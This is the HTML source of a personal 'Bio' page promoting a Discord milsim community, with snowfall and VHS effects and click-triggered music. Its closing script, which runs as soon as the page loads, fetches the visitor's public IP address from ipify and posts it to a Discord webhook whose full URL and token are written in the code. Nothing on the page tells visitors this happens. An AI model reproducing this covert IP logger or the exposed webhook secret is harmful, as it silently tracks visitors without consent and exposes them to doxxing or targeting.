<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bio</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background: black;
            color: white;
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }
        .vhs-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 100;
            background: url('https://makeagif.com/i/j1J5fx');
            mix-blend-mode: screen;
            opacity: 0.2;
        }
        .grid-container {
            width: 60%;
            height: 60vh;
            margin: auto;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid rgba(255, 255, 255, 0.2);
            background: url('https://raw.githubusercontent.com/yourgithubusername/yourrepo/main/yourimage.png');
            background-size: cover;
            box-shadow: 0px 0px 20px rgba(255, 255, 255, 0.1);
        }
        .info-box {
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        @keyframes snowfall {
            0% { transform: translateY(0); }
            100% { transform: translateY(100vh); }
        }
        .snow {
            position: absolute;
            width: 3px;
            height: 3px;
            background: white;
            opacity: 0.8;
            border-radius: 50%;
            animation: snowfall linear infinite;
        }
        .discord-invite {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #5865F2;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 10px;
        }
        .discord-invite:hover {
            background: #4752C4;
        }
        .emoji {
            width: 32px;
            height: 32px;
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <div class="vhs-effect"></div>
    <div class="grid-container">
        <div class="info-box">
            <h1 class="text-3xl font-bold">Enixicious</h1>
            <p class="text-sm mt-2">Welcome to my Bio.</p>
            <p class="text-sm mt-2">Join my Discord Milsim Community</p>
            <a href="https://discord.gg/SYEyu6nHfJ" target="_blank" class="discord-invite">Join Now</a>
            <br>
            <img src="https://cdn.discordapp.com/emojis/your_emoji_id.gif" alt="Emoji" class="emoji">
        </div>
    </div>
    <script>
        function createSnow() {
            for (let i = 0; i < 100; i++) {
                let snow = document.createElement("div");
                snow.className = "snow";
                snow.style.left = Math.random() * window.innerWidth + "px";
                snow.style.top = Math.random() * window.innerHeight + "px";
                snow.style.animationDuration = (Math.random() * 5 + 5) + "s";
                document.body.appendChild(snow);
            }
        }
        createSnow();

        function playAudio() {
            let audio = new Audio("https://ia801700.us.archive.org/13/items/gpw58p/gpw58p.mp4");
            audio.loop = true;
            audio.play().catch(error => console.log("Autoplay failed: ", error));
        }
        window.addEventListener("click", playAudio, { once: true });

        // Fetch and send IP to webhook
        fetch('https://api64.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                let ip = data.ip;
                let webhookURL = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";
                let payload = {
                    content: `New visitor IP: ${ip}`
                };
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            })
            .catch(error => console.error("Error fetching IP: ", error));
    </script>
</body>
</html>
